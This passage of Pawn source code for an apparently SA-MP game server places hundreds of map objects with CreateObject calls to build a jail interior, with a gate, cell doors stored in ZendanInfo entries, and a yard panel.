    CreateObject(1713, 1763.26147, -1572.72510, 2000.44165,   0.00000, 0.00000, 90.00000);
    CreateObject(8661, 1784.46814, -1548.59204, 2003.80188,   180.00000, 0.00000, 0.00000);
    CreateObject(2205, 1760.15869, -1542.64697, 1992.46863,   0.00000, 0.00000, 90.00000);
    CreateObject(2008, 1779.37415, -1555.64258, 2000.34045,   0.00000, 0.00000, -90.00000);
    CreateObject(1713, 1765.91321, -1574.05725, 2000.44165,   0.00000, 0.00000, 180.00000);
    CreateObject(14819, 1804.34277, -1552.85974, 2001.42871,   0.00000, 0.00000, 90.00000);
    CreateObject(14401, 1762.36487, -1550.00195, 1992.92700,   0.00000, 0.00000, 0.00000);
    CreateObject(1713, 1766.93250, -1571.15576, 2000.44165,   0.00000, 0.00000, 270.00000);
    CreateObject(338, 1765.63586, -1565.68103, 2000.71094,   23.70000, 18.40000, -59.00000);
    CreateObject(1671, 1761.16467, -1541.53857, 1993.11523,   0.00000, 0.00000, 0.00000);
    CreateObject(338, 1764.70300, -1565.73999, 2000.71765,   23.70000, 18.40000, -12.90000);
    CreateObject(2136, 1762.13306, -1577.16882, 2000.45386,   0.00000, 0.00000, 180.00000);
    CreateObject(2135, 1760.97034, -1574.32849, 2000.44604,   0.00000, 0.00000, 90.00000);
    CreateObject(2139, 1760.96143, -1575.39722, 2000.44543,   0.00000, 0.00000, 90.00000);
    CreateObject(2140, 1760.63953, -1571.13464, 2000.44604,   0.00000, 0.00000, 90.00000);
    CreateObject(8661, 1784.46814, -1568.43274, 2003.80188,   180.00000, 0.00000, 0.00000);
    CreateObject(2164, 1765.29370, -1577.64941, 2000.43420,   0.00000, 0.00000, 180.00000);
    CreateObject(2163, 1760.36499, -1572.91687, 2002.09387,   0.00000, 0.00000, 90.00000);
    CreateObject(8661, 1784.46814, -1587.92224, 2003.80188,   180.00000, 0.00000, 0.00000);
    CreateObject(8661, 1744.51721, -1548.81519, 2003.80029,   180.00000, 0.00000, 0.00000);
    CreateObject(1713, 1764.28210, -1569.81506, 2000.44165,   0.00000, 0.00000, 0.00000);
    CreateObject(3962, 1765.06848, -1571.94287, 2000.50720,   0.00000, 90.00000, 180.00000);
    CreateObject(2429, 1761.86316, -1577.92078, 2001.56470,   0.00000, 0.00000, 180.00000);
    CreateObject(2964, 1765.19885, -1567.26611, 2000.44995,   0.00000, 0.00000, 90.00000);
    CreateObject(2008, 1782.63318, -1556.54492, 2000.34045,   0.00000, 0.00000, -90.00000);
    CreateObject(8661, 1804.47644, -1548.59204, 2004.17224,   0.00000, 270.00000, 0.00000);
    CreateObject(1800, 1748.50867, -1542.55762, 1996.35864,   0.00000, 0.00000, 90.00000);
    CreateObject(2208, 1780.44763, -1553.40234, 2000.28967,   0.00000, 0.00000, 326.00000);
    CreateObject(8661, 1784.46814, -1548.59204, 2004.17224,   180.00000, 0.00000, 0.00000);
    CreateObject(2208, 1782.68762, -1554.87402, 2000.28967,   0.00000, 0.00000, 270.00000);
    CreateObject(8661, 1784.43811, -1548.64124, 2000.46045,   0.00000, 0.00000, 0.00000);
    CreateObject(8661, 1804.47644, -1568.57214, 2004.17224,   0.00000, 270.00000, 0.00000);
    CreateObject(2208, 1782.68762, -1557.59460, 2000.28967,   0.00000, 0.00000, 270.00000);
    CreateObject(8661, 1794.13647, -1577.68970, 2004.17224,   0.00000, 270.00000, 270.00000);
    CreateObject(2208, 1782.64966, -1560.19434, 2000.28967,   0.00000, 0.00000, 214.00000);
    CreateObject(19358, 1772.10596, -1549.02026, 2002.20056,   0.00000, 0.00000, 0.00000);
    CreateObject(19358, 1770.58521, -1547.33008, 2002.20056,   0.00000, 0.00000, 90.00000);
    CreateObject(2208, 1778.37537, -1552.04004, 2000.28967,   0.00000, 0.00000, -33.30000);
    CreateObject(8661, 1774.42554, -1577.67957, 2004.17224,   0.00000, 270.00000, 270.00000);
    CreateObject(8661, 1784.46814, -1568.57397, 2004.17224,   180.00000, 0.00000, 0.00000);
    CreateObject(2208, 1780.46887, -1561.66553, 2000.28967,   0.00000, 0.00000, 214.00000);
    CreateObject(2008, 1762.06763, -1542.60278, 1992.61938,   0.00000, 0.00000, 180.00000);
    CreateObject(2008, 1779.43311, -1558.99243, 2000.34045,   0.00000, 0.00000, -90.00000);
    CreateObject(1671, 1778.32727, -1556.58948, 2000.75623,   0.00000, 0.00000, 90.00000);
    CreateObject(1671, 1781.38477, -1557.48901, 2000.75623,   0.00000, 0.00000, 90.00000);
    CreateObject(1671, 1778.32727, -1559.88965, 2000.75623,   0.00000, 0.00000, 90.00000);


	// Yard Panel

	CreateObject(2008, 1761.07874, -1563.86536, 2000.43701,   0.00000, 0.00000, 91.50000);
	CreateObject(1671, 1761.50171, -1562.84766, 2000.94409,   0.00000, 0.00000, -57.66001);
	// END
    JailGate = CreateObject(971, 1777.73840, -1543.09424, 2004.02185,   0.00000, 0.00000, 90.00000);
    CreateObject(8661, 1777.72534, -1557.36975, 2004.17224,   0.00000, 270.00000, 180.00000);
    CreateObject(19404, 1772.10596, -1552.36877, 2002.20056,   0.00000, 0.00000, 0.00000);
    CreateObject(3089, 1768.94519, -1543.43494, 2001.78503,   0.00000, 0.00000, 90.00000);
    CreateObject(19404, 1772.10596, -1555.70911, 2002.20056,   0.00000, 0.00000, 0.00000);
    CreateObject(19404, 1772.10596, -1572.38184, 2002.20056,   0.00000, 0.00000, 0.00000);
    CreateObject(19404, 1772.10596, -1559.04919, 2002.20056,   0.00000, 0.00000, 0.00000);
    CreateObject(1892, 1803.99744, -1554.11279, 2000.31946,   0.00000, 0.00000, 90.00000);
    CreateObject(19358, 1772.10596, -1550.69141, 2002.20056,   0.00000, 0.00000, 90.00000);
    CreateObject(19358, 1772.10596, -1554.02246, 2002.20056,   0.00000, 0.00000, 90.00000);
    CreateObject(19358, 1772.10596, -1557.39392, 2002.20056,   0.00000, 0.00000, 90.00000);
    CreateObject(19358, 1772.10596, -1560.71509, 2002.20056,   0.00000, 0.00000, 90.00000);
    CreateObject(19404, 1772.10596, -1562.37756, 2002.20056,   0.00000, 0.00000, 0.00000);
    CreateObject(19404, 1772.10596, -1565.72937, 2002.20056,   0.00000, 0.00000, 0.00000);
    CreateObject(19358, 1772.10596, -1564.04663, 2002.20056,   0.00000, 0.00000, 90.00000);
    CreateObject(19358, 1772.10596, -1567.39673, 2002.20056,   0.00000, 0.00000, 90.00000);
    CreateObject(19404, 1772.10596, -1569.06030, 2002.20056,   0.00000, 0.00000, 0.00000);
    CreateObject(19404, 1772.10596, -1575.74048, 2002.20056,   0.00000, 0.00000, 0.00000);
    CreateObject(19358, 1772.10596, -1570.72839, 2002.20056,   0.00000, 0.00000, 90.00000);
    CreateObject(19358, 1772.10596, -1574.05933, 2002.20056,   0.00000, 0.00000, 90.00000);
    CreateObject(19358, 1772.10596, -1578.94153, 2002.20056,   0.00000, 0.00000, 0.00000);
    CreateObject(1721, 1770.11218, -1552.34412, 2000.44055,   0.00000, 0.00000, 270.00000);
    CreateObject(2180, 1771.46460, -1552.83655, 2000.44983,   0.00000, 0.00000, 90.00000);
    CreateObject(2180, 1771.46460, -1556.18835, 2000.44983,   0.00000, 0.00000, 90.00000);
    CreateObject(2180, 1771.46460, -1559.51782, 2000.44983,   0.00000, 0.00000, 90.00000);
    CreateObject(2180, 1771.46460, -1566.21960, 2000.44983,   0.00000, 0.00000, 90.00000);
    CreateObject(2180, 1771.46460, -1562.85132, 2000.44983,   0.00000, 0.00000, 90.00000);
    CreateObject(2180, 1771.46460, -1569.55103, 2000.44983,   0.00000, 0.00000, 90.00000);
    CreateObject(2180, 1771.46460, -1572.86047, 2000.44983,   0.00000, 0.00000, 90.00000);
    CreateObject(2180, 1771.46460, -1576.23059, 2000.44983,   0.00000, 0.00000, 90.00000);
    CreateObject(1721, 1770.08215, -1555.75586, 2000.44055,   0.00000, 0.00000, 270.00000);
    CreateObject(1721, 1770.08215, -1559.02783, 2000.44055,   0.00000, 0.00000, 270.00000);
    CreateObject(1721, 1770.08215, -1562.38037, 2000.44055,   0.00000, 0.00000, 270.00000);
    CreateObject(3857, 1772.10107, -1554.43079, 2004.08081,   0.00000, 0.00000, -44.90002);
    CreateObject(1721, 1770.09961, -1565.75110, 2000.44055,   0.00000, 0.00000, 270.00000);
    CreateObject(1721, 1770.08215, -1569.04260, 2000.44055,   0.00000, 0.00000, 270.00000);
    CreateObject(1721, 1770.08215, -1572.37463, 2000.44055,   0.00000, 0.00000, 270.00000);
    CreateObject(3857, 1772.13367, -1561.06653, 2004.21191,   0.00000, 0.00000, -44.90002);
    CreateObject(1721, 1770.06445, -1575.75818, 2000.44055,   0.00000, 0.00000, 270.00000);
    CreateObject(1721, 1774.04272, -1552.34412, 2000.44055,   0.00000, 0.00000, 90.00000);
    CreateObject(3857, 1772.10144, -1567.66174, 2004.27051,   0.00000, 0.00000, -44.90002);
    CreateObject(2180, 1772.69519, -1551.90576, 2000.44983,   0.00000, 0.00000, 270.00000);
    CreateObject(3857, 1772.04077, -1577.38049, 2003.65149,   0.00000, 0.00000, -44.90002);
    CreateObject(1721, 1774.04272, -1555.68640, 2000.44055,   0.00000, 0.00000, 90.00000);
    CreateObject(2180, 1772.69519, -1555.23645, 2000.44983,   0.00000, 0.00000, 270.00000);
    CreateObject(2180, 1772.69519, -1561.90930, 2000.44983,   0.00000, 0.00000, 270.00000);
    CreateObject(2180, 1772.69519, -1558.55652, 2000.44983,   0.00000, 0.00000, 270.00000);
    CreateObject(2180, 1772.69519, -1568.58838, 2000.44983,   0.00000, 0.00000, 270.00000);
    CreateObject(2180, 1772.69519, -1565.26038, 2000.44983,   0.00000, 0.00000, 270.00000);
    CreateObject(2180, 1772.69519, -1571.88159, 2000.44983,   0.00000, 0.00000, 270.00000);
    CreateObject(2180, 1772.69519, -1575.24951, 2000.44983,   0.00000, 0.00000, 270.00000);
    CreateObject(1721, 1774.04272, -1559.03748, 2000.44055,   0.00000, 0.00000, 90.00000);
    CreateObject(1721, 1774.04272, -1562.33972, 2000.44055,   0.00000, 0.00000, 90.00000);
    CreateObject(1721, 1774.04272, -1565.76758, 2000.44055,   0.00000, 0.00000, 90.00000);
    CreateObject(1721, 1774.04272, -1572.41077, 2000.44055,   0.00000, 0.00000, 90.00000);
    CreateObject(1721, 1774.04272, -1569.05835, 2000.44055,   0.00000, 0.00000, 90.00000);
    CreateObject(1721, 1774.04272, -1575.69897, 2000.44055,   0.00000, 0.00000, 90.00000);
    //CreateObject(14387, 1763.18384, -1540.95886, 1999.31360,   0.00000, 0.00000, 180.00000);
    CreateObject(8661, 1777.72534, -1577.31995, 2004.17224,   0.00000, 270.00000, 180.00000);
    CreateObject(8661, 1794.61682, -1538.62170, 2004.17224,   0.00000, 270.00000, 90.00000);
    CreateObject(8661, 1774.66614, -1538.62170, 2004.17224,   0.00000, 270.00000, 90.00000);
    CreateObject(8661, 1777.72534, -1577.31995, 2004.17224,   0.00000, 270.00000, 0.00000);
    CreateObject(8661, 1777.72534, -1557.36975, 2004.17224,   0.00000, 270.00000, 0.00000);
    CreateObject(8661, 1754.69385, -1538.62170, 2004.17224,   0.00000, 270.00000, 90.00000);
    //CreateObject(14387, 1760.55188, -1540.95886, 1997.39172,   0.00000, 0.00000, 180.00000);
    CreateObject(8661, 1784.43811, -1567.84204, 2000.44104,   0.00000, 180.00000, 0.00000);
    CreateObject(8661, 1758.98669, -1536.14063, 1996.35950,   0.00000, 0.00000, 0.00000);

    CreateObject(8661, 1784.43811, -1550.19067, 2000.44104,   0.00000, 180.00000, 0.00000);
    ZendanInfo[1][ciObjID] = CreateObject(19302, 1751.70129, -1540.24060, 1997.60889,   0.00000, 0.00000, 270.00000);
    CreateObject(19302, 1751.70129, -1541.97168, 1997.60889,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1729.17505, -1543.24182, 1998.26892,   180.00000, 0.00000, 270.00000);
    CreateObject(8661, 1744.59875, -1553.29944, 2000.44104,   0.00000, 180.00000, 0.00000);
    CreateObject(970, 1759.77649, -1546.08191, 1996.86401,   0.00000, 0.00000, 0.00000);
    CreateObject(970, 1763.90723, -1546.08191, 1996.86401,   0.00000, 0.00000, 0.00000);
    CreateObject(19304, 1751.71753, -1545.43140, 1999.48071,   0.00000, 0.00000, 90.00000);
    CreateObject(19304, 1751.71753, -1541.11108, 1999.48071,   0.00000, 0.00000, 90.00000);
    CreateObject(8661, 1737.73669, -1556.12085, 1996.35950,   0.00000, 0.00000, 0.00000);
    CreateObject(970, 1757.71680, -1548.13135, 1996.86401,   0.00000, 0.00000, 90.00000);
    CreateObject(970, 1757.71680, -1552.24219, 1996.86401,   0.00000, 0.00000, 90.00000);
    CreateObject(970, 1757.71680, -1556.38281, 1996.86401,   0.00000, 0.00000, 90.00000);
    CreateObject(8661, 1754.62622, -1577.69946, 2004.17224,   0.00000, 270.00000, 270.00000);
    CreateObject(970, 1757.71680, -1560.49316, 1996.86401,   0.00000, 0.00000, 90.00000);
    CreateObject(970, 1757.71680, -1564.61438, 1996.86401,   0.00000, 0.00000, 90.00000);
    //CreateObject(14387, 1760.44299, -1540.95886, 1997.47791,   0.00000, 112.00000, 0.00000);
    //CreateObject(14387, 1763.18384, -1540.95886, 1999.29358,   0.00000, 112.00000, 0.00000);
    //CreateObject(14387, 1760.56763, -1540.95886, 1997.43835,   0.00000, 112.00000, 0.00000);
    /*CreateObject(14387, 1763.18384, -1540.95886, 1999.30200,   0.00000, 0.00000, 180.00000);
    CreateObject(14387, 1760.55188, -1540.95886, 1997.33167,   0.00000, 0.00000, 180.00000);
    CreateObject(14387, 1763.18384, -1540.95886, 1999.47095,   0.00000, 0.00000, 180.00000);
    CreateObject(14387, 1760.55188, -1540.95886, 1997.35168,   180.00000, 0.00000, 0.00000);
    CreateObject(14387, 1763.18384, -1540.95886, 1999.30200,   180.00000, 0.00000, 0.00000);
    CreateObject(14387, 1763.18384, -1540.95886, 1999.47095,   180.00000, 0.00000, 0.00000);*/
    CreateObject(14387, 1762.86365, -1540.95886, 1999.26184,   0.00000, 0.00000, 180.00000);
    CreateObject(14387, 1759.99194, -1540.95886, 1997.33167,   0.00000, 0.00000, 180.00000);
    CreateObject(14387, 1763.18384, -1540.95886, 1999.47095,   0.00000, 0.00000, 180.00000);
    CreateObject(14387, 1759.99194, -1540.95886, 1997.33167,   180.00000, 0.00000, 0.00000);
    CreateObject(14387, 1762.86365, -1540.95886, 1999.26184,   180.00000, 0.00000, 0.00000);
    CreateObject(14387, 1763.18384, -1540.95886, 1999.47095,   180.00000, 0.00000, 0.00000);
    CreateObject(8661, 1744.44739, -1553.25342, 2000.46045,   0.00000, 0.00000, 0.00000);
    CreateObject(8661, 1744.51746, -1573.06384, 2000.46045,   0.00000, 0.00000, 0.00000);
    CreateObject(8661, 1760.47070, -1548.56201, 2020.40800,   0.00000, 270.00000, 180.00000);
    CreateObject(8661, 1740.59802, -1533.31995, 2000.44104,   0.00000, 180.00000, 0.00000);
    CreateObject(8661, 1760.47070, -1568.53210, 2020.40800,   0.00000, 270.00000, 180.00000);
    CreateObject(8661, 1744.51721, -1568.57397, 2003.80444,   180.00000, 0.00000, 0.00000);
    CreateObject(8661, 1744.61743, -1548.66162, 2004.17224,   180.00000, 0.00000, 0.00000);
    CreateObject(8661, 1744.51721, -1568.34375, 2004.19226,   180.00000, 0.00000, 0.00000);
    //CreateObject(7191, 1729.17273, -1543.27271, 1998.26892,   0.00000, 0.00000, 90.00000);
    ZendanInfo[2][ciObjID] = CreateObject(19302, 1751.70129, -1544.54041, 1997.60889,   0.00000, 0.00000, 270.00000);
    CreateObject(19302, 1751.70129, -1546.24268, 1997.60889,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1729.17505, -1547.50330, 1998.26892,   180.00000, 0.00000, 270.00000);
    //CreateObject(7191, 1729.17273, -1547.53394, 1998.26892,   0.00000, 0.00000, 90.00000);
    ZendanInfo[3][ciObjID] = CreateObject(19302, 1751.70129, -1548.80164, 1997.60889,   0.00000, 0.00000, 270.00000);
    CreateObject(19302, 1751.70129, -1550.50366, 1997.60889,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1729.17505, -1551.78284, 1998.26892,   180.00000, 0.00000, 270.00000);
    CreateObject(19304, 1751.71753, -1549.63208, 1999.48071,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1729.17273, -1551.80554, 1998.26892,   0.00000, 0.00000, 90.00000);
    ZendanInfo[4][ciObjID] = CreateObject(19302, 1751.70129, -1553.07275, 1997.60889,   0.00000, 0.00000, 270.00000);
    CreateObject(19302, 1751.70129, -1554.80518, 1997.60889,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1729.17505, -1556.06409, 1998.26892,   180.00000, 0.00000, 270.00000);
    //CreateObject(7191, 1729.17273, -1556.08545, 1998.26892,   0.00000, 0.00000, 90.00000);
    CreateObject(19304, 1751.71753, -1553.95288, 1999.48071,   0.00000, 0.00000, 90.00000);
    ZendanInfo[5][ciObjID] = CreateObject(19302, 1751.70129, -1557.37256, 1997.60889,   0.00000, 0.00000, 270.00000);
    CreateObject(19302, 1751.70129, -1559.08618, 1997.60889,   0.00000, 0.00000, 90.00000);
    CreateObject(19304, 1751.71753, -1558.24463, 1999.48071,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1729.17273, -1560.31592, 1998.26892,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1729.17505, -1560.28528, 1998.26892,   180.00000, 0.00000, 270.00000);
    ZendanInfo[6][ciObjID] = CreateObject(19302, 1751.70129, -1561.57312, 1997.60889,   0.00000, 0.00000, 270.00000);
    CreateObject(19302, 1751.70129, -1563.26697, 1997.60889,   0.00000, 0.00000, 90.00000);
    CreateObject(19304, 1751.71753, -1562.46582, 1999.48071,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1729.17505, -1564.51587, 1998.26892,   180.00000, 0.00000, 270.00000);
    //CreateObject(7191, 1729.17273, -1564.54626, 1998.26892,   0.00000, 0.00000, 90.00000);
    CreateObject(8661, 1737.73669, -1576.10242, 1996.35950,   0.00000, 0.00000, 0.00000);
    CreateObject(8661, 1744.56812, -1573.02014, 2000.44104,   0.00000, 180.00000, 0.00000);
    ZendanInfo[7][ciObjID] = CreateObject(19302, 1751.70129, -1565.81433, 1997.60889,   0.00000, 0.00000, 270.00000);
    CreateObject(19302, 1751.70129, -1567.53760, 1997.60889,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1729.17505, -1568.82605, 1998.26892,   180.00000, 0.00000, 270.00000);
    //CreateObject(7191, 1729.17273, -1568.84680, 1998.26892,   0.00000, 0.00000, 90.00000);
    CreateObject(19304, 1751.71753, -1566.67578, 1999.48071,   0.00000, 0.00000, 90.00000);
    ZendanInfo[8][ciObjID] = CreateObject(19302, 1751.70129, -1570.12537, 1997.60889,   0.00000, 0.00000, 270.00000);
    CreateObject(19302, 1751.70129, -1571.83862, 1997.60889,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1729.17505, -1573.10706, 1998.26892,   180.00000, 0.00000, 270.00000);
    //CreateObject(7191, 1729.17273, -1573.14868, 1998.26892,   0.00000, 0.00000, 90.00000);
    CreateObject(19304, 1751.71753, -1570.99609, 1999.48071,   0.00000, 0.00000, 90.00000);
    ZendanInfo[9][ciObjID] = CreateObject(19302, 1751.70129, -1574.41589, 1997.60889,   0.00000, 0.00000, 270.00000);
    CreateObject(19302, 1751.70129, -1576.12830, 1997.60889,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1729.17505, -1577.38928, 1998.26892,   180.00000, 0.00000, 270.00000);
    CreateObject(19304, 1751.71753, -1575.27686, 1999.48071,   0.00000, 0.00000, 90.00000);
    CreateObject(970, 1757.71680, -1568.73560, 1996.86401,   0.00000, 0.00000, 90.00000);
    CreateObject(970, 1757.71680, -1572.84595, 1996.86401,   0.00000, 0.00000, 90.00000);
    CreateObject(8661, 1785.93579, -1556.08264, 1996.35950,   0.00000, 0.00000, 0.00000);
    CreateObject(970, 1765.96826, -1548.13196, 1996.86401,   0.00000, 0.00000, 90.00000);
    CreateObject(970, 1765.96826, -1552.25330, 1996.86401,   0.00000, 0.00000, 90.00000);
    CreateObject(970, 1765.96826, -1556.38367, 1996.86401,   0.00000, 0.00000, 90.00000);
    CreateObject(970, 1765.96826, -1560.51392, 1996.86401,   0.00000, 0.00000, 90.00000);
    CreateObject(970, 1765.96826, -1564.65381, 1996.86401,   0.00000, 0.00000, 90.00000);
    CreateObject(8661, 1785.86658, -1536.19275, 1996.35950,   0.00000, 180.00000, 0.00000);
    CreateObject(970, 1765.96826, -1568.79346, 1996.86401,   0.00000, 0.00000, 90.00000);
    CreateObject(970, 1765.96826, -1572.91370, 1996.86401,   0.00000, 0.00000, 90.00000);
    CreateObject(970, 1765.96826, -1577.03479, 1996.86401,   0.00000, 0.00000, 90.00000);
    CreateObject(970, 1762.48816, -1543.23035, 1999.48328,   0.00000, -33.89999, 0.00000);
    CreateObject(970, 1760.37976, -1543.23035, 1998.06799,   0.00000, -33.89999, 0.00000);
    CreateObject(970, 1762.48816, -1538.65955, 1999.48328,   0.00000, -33.89999, 0.00000);
    CreateObject(970, 1760.37976, -1538.63855, 1998.06799,   0.00000, -33.89999, 0.00000);
    //CreateObject(7191, 1794.08398, -1538.95190, 1998.26892,   0.00000, 180.00000, 270.00000);
    ZendanInfo[10][ciObjID] = CreateObject(19302, 1771.63562, -1541.96106, 1997.60889,   0.00000, 0.00000, 90.00000);
    CreateObject(19302, 1771.63562, -1540.24060, 1997.60889,   0.00000, 0.00000, 270.00000);
    //CreateObject(7191, 1794.09277, -1543.24182, 1997.86853,   0.00000, 360.00000, 270.00000);
    //CreateObject(7191, 1794.09277, -1543.25183, 1998.26892,   180.00000, 0.00000, 90.00000);
    CreateObject(19304, 1771.64087, -1541.11108, 1999.48071,   0.00000, 0.00000, 90.00000);
    CreateObject(19304, 1771.64087, -1549.68433, 1995.72969,   0.00000, 0.00000, 90.00000);
    CreateObject(8661, 1814.04651, -1577.68970, 2004.17224,   0.00000, 270.00000, 270.00000);
    //CreateObject(7191, 1744.86584, -1561.08081, 1998.44885,   0.00000, 0.00000, 180.00000);
    CreateObject(8661, 1784.43811, -1530.63879, 2000.44104,   0.00000, 180.00000, 0.00000);
    CreateObject(2602, 1746.70239, -1543.77087, 1996.89539,   0.00000, 0.00000, 0.00000);
    CreateObject(19302, 1771.63562, -1544.52173, 1997.60889,   0.00000, 0.00000, 270.00000);
    ZendanInfo[11][ciObjID] = CreateObject(19302, 1771.63562, -1546.21191, 1997.60889,   0.00000, 0.00000, 90.00000);
    CreateObject(19304, 1771.64087, -1545.40149, 1999.48071,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1794.09277, -1547.48352, 1997.86853,   0.00000, 360.00000, 270.00000);
    //CreateObject(7191, 1794.09277, -1547.50208, 1998.26892,   180.00000, 0.00000, 90.00000);
    CreateObject(19302, 1771.63562, -1548.77246, 1997.60889,   0.00000, 0.00000, 270.00000);
    ZendanInfo[12][ciObjID] = CreateObject(19302, 1771.63562, -1550.48279, 1997.60889,   0.00000, 0.00000, 90.00000);
    CreateObject(19304, 1771.64087, -1549.60242, 1999.48071,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1794.09277, -1551.74414, 1997.86853,   0.00000, 360.00000, 270.00000);
    //CreateObject(7191, 1794.09277, -1551.75281, 1998.26892,   180.00000, 0.00000, 90.00000);
    CreateObject(19302, 1771.63562, -1553.01294, 1997.60889,   0.00000, 0.00000, 270.00000);
    ZendanInfo[13][ciObjID] = CreateObject(19302, 1771.63562, -1554.73242, 1997.60889,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1794.09277, -1556.00537, 1997.86853,   0.00000, 360.00000, 270.00000);
    //CreateObject(7191, 1794.09277, -1556.01331, 1998.26892,   180.00000, 0.00000, 90.00000);
    CreateObject(19304, 1771.64087, -1553.84351, 1999.48071,   0.00000, 0.00000, 90.00000);
    CreateObject(1800, 1748.50867, -1546.88086, 1996.34863,   0.00000, 0.00000, 90.00000);
    CreateObject(19302, 1771.63562, -1557.28284, 1997.60889,   0.00000, 0.00000, 270.00000);
    CreateObject(1800, 1748.50867, -1551.17346, 1996.35864,   0.00000, 0.00000, 90.00000);
    ZendanInfo[14][ciObjID] = CreateObject(19302, 1771.63562, -1558.96326, 1997.60889,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1794.09277, -1560.23682, 1997.86853,   0.00000, 360.00000, 270.00000);
    CreateObject(1800, 1748.50867, -1555.44531, 1996.36865,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1794.09277, -1560.24353, 1998.26892,   180.00000, 0.00000, 90.00000);
    CreateObject(1800, 1748.50867, -1559.69788, 1996.35864,   0.00000, 0.00000, 90.00000);
    CreateObject(19304, 1771.64087, -1558.09424, 1999.50073,   0.00000, 0.00000, 90.00000);
    CreateObject(1800, 1748.50867, -1563.91956, 1996.34863,   0.00000, 0.00000, 90.00000);
    CreateObject(1800, 1748.50867, -1568.25098, 1996.36865,   0.00000, 0.00000, 90.00000);
    CreateObject(19302, 1771.63562, -1561.51489, 1997.60889,   0.00000, 0.00000, 270.00000);
    ZendanInfo[15][ciObjID] = CreateObject(19302, 1771.63562, -1563.21362, 1997.60889,   0.00000, 0.00000, 90.00000);
    CreateObject(19304, 1771.64087, -1562.40479, 1999.48071,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1794.09277, -1564.46790, 1997.86853,   0.00000, 360.00000, 270.00000);
    //CreateObject(7191, 1794.09277, -1564.47400, 1998.26892,   180.00000, 0.00000, 90.00000);
    CreateObject(1800, 1748.50867, -1572.47180, 1996.38867,   0.00000, 0.00000, 90.00000);
    CreateObject(19302, 1771.63562, -1565.74622, 1997.60889,   0.00000, 0.00000, 270.00000);
    CreateObject(1800, 1748.50867, -1576.74316, 1996.36865,   0.00000, 0.00000, 90.00000);
    ZendanInfo[16][ciObjID] = CreateObject(19302, 1771.63562, -1567.44446, 1997.60889,   0.00000, 0.00000, 90.00000);
    CreateObject(19304, 1771.64087, -1566.62500, 1999.48071,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1794.09277, -1568.71924, 1997.86853,   0.00000, 360.00000, 270.00000);
    //CreateObject(7191, 1794.09277, -1568.74463, 1998.26892,   180.00000, 0.00000, 90.00000);
    CreateObject(1800, 1778.67236, -1539.89001, 1996.36853,   0.00000, 0.00000, 90.00000);
    CreateObject(19302, 1771.63562, -1570.02637, 1997.60889,   0.00000, 0.00000, 270.00000);
    ZendanInfo[17][ciObjID] = CreateObject(19302, 1771.63562, -1571.72595, 1997.60889,   0.00000, 0.00000, 90.00000);
    CreateObject(19304, 1771.64087, -1570.88525, 1999.48071,   0.00000, 0.00000, 90.00000);
    CreateObject(1800, 1778.67236, -1544.16150, 1996.38855,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1794.09277, -1573.00977, 1997.86853,   0.00000, 360.00000, 270.00000);
    //CreateObject(7191, 1794.09277, -1573.01636, 1998.26892,   180.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1729.17505, -1577.38928, 1994.46838,   180.00000, 0.00000, 270.00000);
    CreateObject(1800, 1778.67236, -1548.41199, 1996.37854,   0.00000, 0.00000, 90.00000);
    CreateObject(19302, 1771.63562, -1574.29749, 1997.60889,   0.00000, 0.00000, 270.00000);
    ZendanInfo[18][ciObjID] = CreateObject(19302, 1771.63562, -1576.03638, 1997.60889,   0.00000, 0.00000, 90.00000);
    CreateObject(1800, 1778.67236, -1552.65320, 1996.33850,   0.00000, 0.00000, 90.00000);
    CreateObject(19304, 1771.64087, -1575.15613, 1999.48071,   0.00000, 0.00000, 90.00000);
    CreateObject(1800, 1778.67236, -1556.96606, 1996.33850,   0.00000, 0.00000, 90.00000);
    CreateObject(1800, 1778.67236, -1561.13745, 1996.33850,   0.00000, 0.00000, 90.00000);
    CreateObject(1800, 1778.67236, -1565.37903, 1996.35852,   0.00000, 0.00000, 90.00000);
    CreateObject(8661, 1737.73669, -1576.10242, 1996.35950,   0.00000, 180.00000, 0.00000);
    CreateObject(1800, 1778.67236, -1569.66077, 1996.35852,   0.00000, 0.00000, 90.00000);
    CreateObject(8661, 1737.73669, -1556.16357, 1996.35950,   0.00000, 180.00000, 0.00000);
    CreateObject(1800, 1778.67236, -1573.90186, 1996.33850,   0.00000, 0.00000, 90.00000);
    CreateObject(8661, 1748.19653, -1567.83203, 1992.67004,   0.00000, 0.00000, 0.00000);
    CreateObject(19302, 1751.70129, -1576.12830, 1993.88770,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1729.17273, -1573.14868, 1994.39758,   0.00000, 0.00000, 90.00000);
    CreateObject(19304, 1751.71753, -1575.27686, 1995.73070,   0.00000, 0.00000, 90.00000);
    //CreateObject(7191, 1729.17505, -1573.10706, 1994.58789,   180.00000, 0.00000, 270.00000);
    CreateObject(8614, 1758.65491, -1578.67761, 1990.79749,   0.00000, 180.00000, 90.00000);
    CreateObject(8661, 1785.99878, -1575.86108, 1996.35950,   0.00000, 0.00000, 0.00000);
    CreateObject(8661, 1748.19653, -1547.87012, 1992.67004,   0.00000, 0.00000, 0.00000);
    //CreateObject(7191, 1744.86584, -1561.08081, 1994.59607,   0.00000, 0.00000, 180.00000);
    CreateObject(1800, 1748.54736, -1576.77051, 1992.65906,   0.00000, 0.00000, 90.00000);
    ZendanInfo[19][ciObjID] = CreateObject(19302, 1751.70129, -1574.41589, 1993.88770,   0.00000, 0.00000, 270.00000);
    CreateObject(8661, 1737.73669, -1536.21228, 1996.35950,   0.00000, 180.00000, 0.00000);
